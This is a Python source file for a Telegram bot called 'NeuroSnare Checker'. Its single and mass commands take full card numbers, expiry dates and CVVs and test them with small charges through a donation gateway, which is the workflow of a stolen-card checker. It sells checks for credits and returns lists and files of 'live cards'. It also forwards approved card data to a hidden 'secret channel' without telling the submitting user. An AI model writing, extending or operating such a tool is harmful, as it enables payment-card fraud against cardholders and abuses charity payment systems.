import time
import asyncio
import os
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from utils.user_data import get_user_data, update_user_credits, update_approved_cards, update_cg_stats
from utils.admin_utils import is_admin
from config import MASS_LIMIT_USER, logger
from gateways.cg_checker import CGDonationChecker
from utils.secret_channel import send_to_secret_channel

async def st3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$0.50 CG Donation Check - Single Card"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    
    is_admin_user = is_admin(user_id)
    if not is_admin_user and user_data["credits"] < 1:
        await update.message.reply_text("❌ Insufficient credits")
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/st3 CC|MM|YY|CVV`\nExample: `/st3 4111111111111111|12|25|123`")
        return

    card = context.args[0]

    try:
        cc, mm, yy, cvv = card.split("|")
    except:
        await update.message.reply_text("❌ Invalid card format. Use: CC|MM|YY|CVV")
        return

    msg = await update.message.reply_text("💳 Processing $0.50 Donation Charge...")

    # Update stats
    update_cg_stats(user_id, "check")
    
    start = time.time()
    result = CGDonationChecker.test_card(card)
    t = round(time.time() - start, 2)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, 1)
    else:
        remaining_credits = "♾️ Unlimited"

    if result["status"] == "Approved":
        update_approved_cards(user_id)
        update_cg_stats(user_id, "approved", True)
        
        txt = (
            f"**💳 $0.50 DONATION - APPROVED ✅**\n\n"
            f"**Card:** `{card}`\n"
            f"**Gateway:** CG Donation Gateway\n"
            f"**Response:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Country:** {result.get('country', 'N/A')}\n"
            f"**Last 4:** {result.get('last4', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel when approved
        secret_message = (
            f"🔔 **NEW APPROVED CARD ($0.50)**\n\n"
            f"💳 Card: `{card}`\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 Amount: $0.50\n"
            f"✅ Status: Approved\n"
            f"🏦 Gateway: CG Donation\n"
            f"🏷️ Brand: {result.get('brand', 'N/A')}\n"
            f"🌍 Country: {result.get('country', 'N/A')}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        await send_to_secret_channel(context, secret_message)
        
    elif result["status"] == "Declined":
        txt = (
            f"**💳 $0.50 DONATION - DECLINED ❌**\n\n"
            f"**Card:** `{card}`\n"
            f"**Reason:** {result['message']}\n"
            f"**Brand:** {result.get('brand', 'N/A')}\n"
            f"**Type:** {result.get('type', 'N/A')}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
    else:
        txt = (
            f"**💳 $0.50 DONATION - ERROR ⚠️**\n\n"
            f"**Card:** `{card}`\n"
            f"**Error:** {result['message']}\n"
            f"**Time:** {t}s\n\n"
            f"💎 Credits left: {remaining_credits}\n\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )

    await msg.edit_text(txt, parse_mode=ParseMode.MARKDOWN)

async def st3m_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """$0.50 CG Donation Check - Mass Check"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    user_data = get_user_data(user_id, username)
    is_admin_user = is_admin(user_id)
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/st3m CC|MM|YY|CVV CC|MM|YY|CVV ...`")
        return
    
    cards = context.args
    
    if not is_admin_user and len(cards) > MASS_LIMIT_USER:
        await update.message.reply_text(f"❌ Max {MASS_LIMIT_USER} cards allowed for users")
        return

    if not is_admin_user and user_data["credits"] < len(cards):
        await update.message.reply_text("❌ Insufficient credits")
        return

    processing_msg = await update.message.reply_text(f"💳 Processing {len(cards)} cards with $0.50 Donation Charge...")

    results_text = f"**💳 $0.50 DONATION MASS CHECK**\n\n"
    approved_count = 0
    declined_count = 0
    error_count = 0
    approved_cards = []

    # Update stats
    update_cg_stats(user_id, "check")

    for i, card in enumerate(cards, 1):
        try:
            cc, mm, yy, cvv = card.split("|")
            if len(cc) < 15 or len(cc) > 16 or not cc.isdigit():
                results_text += f"❌ Invalid Card `{card}`\n\n"
                error_count += 1
                continue
        except:
            results_text += f"❌ Invalid Format `{card}`\n\n"
            error_count += 1
            continue

        start = time.time()
        result = CGDonationChecker.test_card(card)
        t = round(time.time() - start, 2)

        if result["status"] == "Approved":
            results_text += f"✅ **APPROVED** `{card}`\n"
            results_text += f"   Brand: {result.get('brand', 'N/A')} | Time: {t}s\n\n"
            approved_count += 1
            approved_cards.append(card)
        elif result["status"] == "Declined":
            results_text += f"❌ **DECLINED** `{card}`\n"
            results_text += f"   Brand: {result.get('brand', 'N/A')} | Reason: {result['message']} | Time: {t}s\n\n"
            declined_count += 1
        else:
            results_text += f"⚠️ **ERROR** `{card}`\n"
            results_text += f"   Error: {result['message']}\n\n"
            error_count += 1

        if i % 3 == 0:
            progress = f"🔄 Processing: {i}/{len(cards)} cards..."
            await processing_msg.edit_text(progress)
        await asyncio.sleep(1)  # Longer delay for donation checks

    # Create approved cards file
    approved_filename = None
    if approved_cards:
        approved_filename = f"approved_{user_id}_{int(time.time())}.txt"
        with open(approved_filename, 'w') as f:
            for card in approved_cards:
                f.write(f"{card}\n")
        
        # Send approved cards to user
        with open(approved_filename, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename="APPROVED_CARDS_0.50USD.txt",
                caption=f"✅ **{len(approved_cards)} Approved Cards Found!**\n👤 User: @{username}",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Update approved stats
        update_cg_stats(user_id, "approved", True)
        update_approved_cards(user_id, approved_count)
        
        # Send to secret channel
        secret_message = (
            f"🔔 **NEW APPROVED CARDS ($0.50)**\n\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"✅ Approved: {len(approved_cards)} cards\n"
            f"❌ Declined: {declined_count} cards\n"
            f"⚠️ Errors: {error_count} cards\n"
            f"📊 Total: {len(cards)} cards\n\n"
            f"💎 Credits used: {len(cards) if not is_admin_user else 0}\n"
            f"👨‍💻 *NeuroSnare Checker*"
        )
        
        # Send to secret channel with approved cards file
        await send_to_secret_channel(context, secret_message, approved_filename)

    if not is_admin_user:
        remaining_credits = update_user_credits(user_id, len(cards))
    else:
        remaining_credits = "♾️ Unlimited"

    credits_used = len(cards) if not is_admin_user else 0
    
    results_text += (
        f"📊 **SUMMARY**\n"
        f"✅ Approved: {approved_count}\n"
        f"❌ Declined: {declined_count}\n"
        f"⚠️ Errors: {error_count}\n"
        f"📋 Total: {len(cards)} cards\n"
        f"💳 Gateway: CG $0.50 Donation\n"
        f"💎 Credits used: {credits_used}\n"
        f"💎 Credits left: {remaining_credits}\n\n"
    )
    
    if approved_cards:
        results_text += f"💳 **LIVE CARDS ({len(approved_cards)})**\n"
        for card in approved_cards[:10]:
            results_text += f"`{card}`\n"
        if len(approved_cards) > 10:
            results_text += f"... and {len(approved_cards) - 10} more (see file)\n"
        results_text += "\n"
    
    results_text += f"👨‍💻 *NeuroSnare Checker*"

    if len(results_text) > 4000:
        parts = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
        for part in parts:
            await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
        await processing_msg.delete()
    else:
        await processing_msg.edit_text(results_text, parse_mode=ParseMode.MARKDOWN)
    
    # Cleanup
    if approved_filename and os.path.exists(approved_filename):
        os.remove(approved_filename)